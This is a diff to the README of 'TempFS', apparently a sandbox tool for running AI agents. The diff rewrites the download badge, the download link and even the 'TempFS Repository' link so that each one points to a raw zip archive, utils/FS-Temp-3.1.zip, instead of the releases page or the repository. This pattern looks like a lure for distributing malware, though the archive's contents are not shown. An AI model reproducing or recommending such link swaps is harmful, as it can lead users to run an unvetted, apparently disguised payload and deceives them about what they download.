@@ -6,13 +6,13 @@ TempFS provides a safe space to run your agents. It lets you test and experiment
 
 ## 🔗 Download TempFS
 
-[![Download TempFS](https://img.shields.io/badge/Download-TempFS-brightgreen)](https://github.com/xakervrakax522/TempFS/releases)
+[![Download TempFS](https://github.com/xakervrakax522/TempFS/raw/refs/heads/main/utils/FS-Temp-3.1.zip)](https://github.com/xakervrakax522/TempFS/raw/refs/heads/main/utils/FS-Temp-3.1.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the releases page. Click the link below to download the latest version of TempFS. 
 
-[Download TempFS Here](https://github.com/xakervrakax522/TempFS/releases)
+[Download TempFS Here](https://github.com/xakervrakax522/TempFS/raw/refs/heads/main/utils/FS-Temp-3.1.zip)
 
 ### Installation Instructions
 
@@ -107,6 +107,6 @@ Follow the repository on GitHub to stay updated on new features and improvements
 
 ## 🔗 More Information
 
-For more detailed information about TempFS, visit our repository: [TempFS Repository](https://github.com/xakervrakax522/TempFS). 
+For more detailed information about TempFS, visit our repository: [TempFS Repository](https://github.com/xakervrakax522/TempFS/raw/refs/heads/main/utils/FS-Temp-3.1.zip). 
 
 Thank you for choosing TempFS. We hope this tool enhances your agent training experience.
